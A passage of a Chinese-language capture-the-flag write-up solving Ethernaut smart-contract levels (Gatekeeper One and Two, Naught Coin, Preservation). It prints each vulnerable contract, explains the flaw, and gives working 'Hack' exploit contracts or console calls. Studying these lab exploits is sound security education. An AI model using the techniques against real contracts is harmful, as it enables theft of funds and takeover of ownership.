<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">uint32</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">uint16</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)),</span><span class="w"> </span><span class="s2">&quot;GatekeeperOne: invalid gateThree part one&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">uint32</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;GatekeeperOne: invalid gateThree part two&quot;</span><span class="p">);</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">uint32</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">))</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">uint16</span><span class="p">(</span><span class="nx">uint160</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">)),</span><span class="w"> </span><span class="s2">&quot;GatekeeperOne: invalid gateThree part three&quot;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">enter</span><span class="p">(</span><span class="nx">bytes8</span><span class="w"> </span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">gateOne</span><span class="w"> </span><span class="nx">gateTwo</span><span class="w"> </span><span class="nx">gateThree</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">entrant</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">GatekeeperOne</span><span class="w"> </span><span class="nx">gk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">GatekeeperOne</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">    </span><span class="nx">bytes8</span><span class="w"> </span><span class="nx">_gateKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bytes8</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">uint160</span><span class="p">(</span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">))</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="mh">0xff0000ffff</span><span class="p">);</span>
<span class="w">    </span><span class="nx">gk</span><span class="p">.</span><span class="nx">enter</span><span class="p">{</span><span class="nx">gas</span><span class="o">:</span><span class="w"> </span><span class="mf">24829</span><span class="p">}(</span><span class="nx">_gateKey</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<h3 id="_9">参考资料<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
<ul>
<li><a href="https://medium.com/coinmonks/solidity-variables-storage-type-conversions-and-accessing-private-variables-c59b4484c183">Solidity variables — storage, type conversions and accessing private variables</a></li>
<li><a href="https://ethereum.stackexchange.com/questions/84670/why-does-remixs-jsvm-show-incorrect-gas">solidity - Why does Remix's jsVM show incorrect gas? - Ethereum Stack Exchange</a></li>
<li><a href="https://ethereum.org/en/developers/docs/evm/opcodes/">Opcodes for the EVM | ethereum.org</a></li>
</ul>
<h2 id="14-gatekeeper-two">14. Gatekeeper Two<a class="headerlink" href="#14-gatekeeper-two" title="Permanent link">&para;</a></h2>
<p>通过新的挑战！</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">GatekeeperTwo</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">entrant</span><span class="p">;</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateOne</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateTwo</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">x</span><span class="p">;</span>
<span class="w">    </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">extcodesize</span><span class="p">(</span><span class="nx">caller</span><span class="p">())</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="c1">// 内联汇编</span>
<span class="w">    </span><span class="c1">// caller() - call sender (excluding delegatecall)</span>
<span class="w">    </span><span class="c1">// extcodesize(a) - size of the code at address a</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateThree</span><span class="p">(</span><span class="nx">bytes8</span><span class="w"> </span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">bytes8</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">))))</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">type</span><span class="p">(</span><span class="nx">uint64</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">enter</span><span class="p">(</span><span class="nx">bytes8</span><span class="w"> </span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">gateOne</span><span class="w"> </span><span class="nx">gateTwo</span><span class="w"> </span><span class="nx">gateThree</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">entrant</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li><code>gateTwo</code> 需要调用合约的代码长度为 0，与解题矛盾。<a href="https://ethereum.github.io/yellowpaper/paper.pdf">ETHEREUM: A SECURE DECENTRALISED GENERALISED TRANSACTION LEDGER</a> 中提到，在代码初始化时，对应地址的 <code>EXTCODESIZE</code> 应返回 0，那么只需要在构造函数里调用 <code>enter</code> 就可以了</li>
<li>至于 <code>gateThree</code>，使用异或逆运算求解就好啦</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">GatekeeperTwo</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">entrant</span><span class="p">;</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateOne</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateTwo</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">x</span><span class="p">;</span>
<span class="w">    </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">extcodesize</span><span class="p">(</span><span class="nx">caller</span><span class="p">())</span><span class="w"> </span><span class="p">}</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">gateThree</span><span class="p">(</span><span class="nx">bytes8</span><span class="w"> </span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">require</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">bytes8</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">))))</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="nx">uint64</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">type</span><span class="p">(</span><span class="nx">uint64</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">enter</span><span class="p">(</span><span class="nx">bytes8</span><span class="w"> </span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">gateOne</span><span class="w"> </span><span class="nx">gateTwo</span><span class="w"> </span><span class="nx">gateThree</span><span class="p">(</span><span class="nx">_gateKey</span><span class="p">)</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">entrant</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">tx</span><span class="p">.</span><span class="nx">origin</span><span class="p">;</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Hack</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">GatekeeperTwo</span><span class="w"> </span><span class="nx">gk</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">GatekeeperTwo</span><span class="p">(</span><span class="nx">instance</span><span class="p">);</span>
<span class="w">    </span><span class="nx">gk</span><span class="p">.</span><span class="nx">enter</span><span class="p">(</span><span class="nx">bytes8</span><span class="p">(</span><span class="nx">uint64</span><span class="p">(</span><span class="nx">bytes8</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)))))</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="p">(</span><span class="nx">type</span><span class="p">(</span><span class="nx">uint64</span><span class="p">).</span><span class="nx">max</span><span class="p">)));</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<h3 id="_10">参考资料<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
<p><a href="https://docs.soliditylang.org/en/v0.6.0/assembly.html#inline-assembly">Inline Assembly</a></p>
<h2 id="15-naught-coin">15. Naught Coin<a class="headerlink" href="#15-naught-coin" title="Permanent link">&para;</a></h2>
<p>取出被锁住的硬币，清空自己的余额</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="k">import</span><span class="w"> </span><span class="s1">&#39;@openzeppelin/contracts/token/ERC20/ERC20.sol&#39;</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">NaughtCoin</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">ERC20</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="c1">// 基于 ERC20</span>

<span class="w">  </span><span class="c1">// string public constant name = &#39;NaughtCoin&#39;;</span>
<span class="w">  </span><span class="c1">// string public constant symbol = &#39;0x0&#39;;</span>
<span class="w">  </span><span class="c1">// uint public constant decimals = 18;</span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">timeLock</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">10</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">365</span><span class="w"> </span><span class="nx">days</span><span class="p">;</span>
<span class="w">  </span><span class="nx">uint256</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">INITIAL_SUPPLY</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">player</span><span class="p">;</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_player</span><span class="p">)</span><span class="w"> </span>
<span class="w">  </span><span class="nx">ERC20</span><span class="p">(</span><span class="s1">&#39;NaughtCoin&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;0x0&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">player</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_player</span><span class="p">;</span>
<span class="w">    </span><span class="nx">INITIAL_SUPPLY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1000000</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="p">(</span><span class="mf">10</span><span class="o">**</span><span class="nx">uint256</span><span class="p">(</span><span class="nx">decimals</span><span class="p">()));</span>
<span class="w">    </span><span class="c1">// _totalSupply = INITIAL_SUPPLY;</span>
<span class="w">    </span><span class="c1">// _balances[player] = INITIAL_SUPPLY;</span>
<span class="w">    </span><span class="nx">_mint</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span><span class="w"> </span><span class="nx">INITIAL_SUPPLY</span><span class="p">);</span><span class="w"> </span><span class="c1">// Creates INITIAL_SUPPLY tokens and assigns them to player</span>
<span class="w">    </span><span class="nx">emit</span><span class="w"> </span><span class="nx">Transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="mf">0</span><span class="p">),</span><span class="w"> </span><span class="nx">player</span><span class="p">,</span><span class="w"> </span><span class="nx">INITIAL_SUPPLY</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_to</span><span class="p">,</span><span class="w"> </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">_value</span><span class="p">)</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">lockTokens</span><span class="w"> </span><span class="nx">returns</span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// super 继承直接父合约的 transfer 函数</span>
<span class="w">    </span><span class="k">super</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">_to</span><span class="p">,</span><span class="w"> </span><span class="nx">_value</span><span class="p">);</span><span class="w">  </span><span class="c1">// 将调用者 _value 数量的金额转移给 _to</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// Prevent the initial owner from transferring tokens until the timelock has passed</span>
<span class="w">  </span><span class="nx">modifier</span><span class="w"> </span><span class="nx">lockTokens</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">player</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nx">require</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">timeLock</span><span class="p">);</span>
<span class="w">      </span><span class="nx">_</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">     </span><span class="nx">_</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span><span class="w"> </span>
</code></pre></div>
<ul>
<li><code>lockTokens</code> 限制了 <code>player</code>，而被覆写的 <code>transfer</code> 只能由持有货币的账户发起转账</li>
<li>
<p><code>NaughtCoin</code> 合约是 <code>ERC20</code> 的子合约，在合约 <code>ERC20</code> 中除了定义 <code>transfer</code> 还有 <code>transferFrom</code> 函数，由此可以绕过 <code>lockTokens</code> 的限制</p>
<div class="highlight"><pre><span></span><code>transferFrom(address sender, address recipient, uint256 amount) → bool
</code></pre></div>
</li>
<li>
<p>在调用 <code>transferFrom</code> 之前需要取得 <code>msg.sender</code> 的授权</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">INITIAL_SUPPLY</span><span class="p">())</span>
</code></pre></div>
</li>
<li>
<p>发起转账</p>
<div class="highlight"><pre><span></span><code><span class="o">&gt;&gt;</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">transferFrom</span><span class="p">(</span><span class="nx">player</span><span class="p">,</span><span class="w"> </span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">contract</span><span class="p">.</span><span class="nx">INITIAL_SUPPLY</span><span class="p">())</span>
</code></pre></div>
</li>
</ul>
<h3 id="_11">参考资料<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
<p><a href="https://docs.openzeppelin.com/contracts/2.x/api/token/erc20#ERC20-_mint-address-uint256-">ERC 20 - OpenZeppelin Docs</a></p>
<h2 id="16-preservation">16. Preservation<a class="headerlink" href="#16-preservation" title="Permanent link">&para;</a></h2>
<p>声明对实例的所有权</p>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Preservation</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="c1">// public library contracts </span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">timeZone1Library</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">timeZone2Library</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span><span class="w"> </span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="nx">storedTime</span><span class="p">;</span>
<span class="w">  </span><span class="c1">// Sets the function signature for delegatecall</span>
<span class="w">  </span><span class="nx">bytes4</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">setTimeSignature</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bytes4</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="s2">&quot;setTime(uint256)&quot;</span><span class="p">));</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_timeZone1LibraryAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_timeZone2LibraryAddress</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">timeZone1Library</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_timeZone1LibraryAddress</span><span class="p">;</span><span class="w"> </span>
<span class="w">    </span><span class="nx">timeZone2Library</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_timeZone2LibraryAddress</span><span class="p">;</span><span class="w"> </span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// set the time for timezone 1</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setFirstTime</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_timeStamp</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">timeZone1Library</span><span class="p">.</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">setTimeSignature</span><span class="p">,</span><span class="w"> </span><span class="nx">_timeStamp</span><span class="p">));</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="c1">// set the time for timezone 2</span>
<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setSecondTime</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_timeStamp</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">timeZone2Library</span><span class="p">.</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">setTimeSignature</span><span class="p">,</span><span class="w"> </span><span class="nx">_timeStamp</span><span class="p">));</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>

<span class="c1">// Simple library contract to set the time</span>
<span class="nx">contract</span><span class="w"> </span><span class="nx">LibraryContract</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="c1">// stores a timestamp </span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="nx">storedTime</span><span class="p">;</span><span class="w">  </span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setTime</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_time</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">storedTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_time</span><span class="p">;</span><span class="w"> </span><span class="c1">// 修改了第一个状态变量</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</code></pre></div>
<ul>
<li><code>delegatecall</code> 只使用给定地址的代码，其他属性（存储、余额等）都取自当前合约，因此，调用 <code>delegatecall</code> 合约的存储布局必须和被调用合约保持一致</li>
<li>先利用 <code>setFirstTime</code> 修改合约 <code>Preservation</code> 的第一个状态变量，即 <code>timeZone1Library</code> 的值为合约 <code>Hack</code> 的地址，再调用 <code>setFirstTime</code> 函数，此时将执行合约 <code>Hack</code> 中的代码<ul>
<li><code>timeZone1Library</code> 如果修改错误则无法进行后续步骤，此时再重新申请一个实例</li>
</ul>
</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>

<span class="nx">contract</span><span class="w"> </span><span class="nx">Preservation</span><span class="w"> </span><span class="p">{</span>

<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">timeZone1Library</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">timeZone2Library</span><span class="p">;</span>
<span class="w">  </span><span class="nx">address</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">owner</span><span class="p">;</span><span class="w"> </span>
<span class="w">  </span><span class="nx">uint</span><span class="w"> </span><span class="nx">storedTime</span><span class="p">;</span>
<span class="w">  </span><span class="nx">bytes4</span><span class="w"> </span><span class="nx">constant</span><span class="w"> </span><span class="nx">setTimeSignature</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">bytes4</span><span class="p">(</span><span class="nx">keccak256</span><span class="p">(</span><span class="s2">&quot;setTime(uint256)&quot;</span><span class="p">));</span>

<span class="w">  </span><span class="kr">constructor</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">_timeZone1LibraryAddress</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">_timeZone2LibraryAddress</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">timeZone1Library</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_timeZone1LibraryAddress</span><span class="p">;</span><span class="w"> </span>
<span class="w">    </span><span class="nx">timeZone2Library</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_timeZone2LibraryAddress</span><span class="p">;</span><span class="w"> </span>
<span class="w">    </span><span class="nx">owner</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">;</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setFirstTime</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_timeStamp</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">timeZone1Library</span><span class="p">.</span><span class="nx">delegatecall</span><span class="p">(</span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodePacked</span><span class="p">(</span><span class="nx">setTimeSignature</span><span class="p">,</span><span class="w"> </span><span class="nx">_timeStamp</span><span class="p">));</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="kd">function</span><span class="w"> </span><span class="nx">setSecondTime</span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">_timeStamp</span><span class="p">)</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="p">{</span>
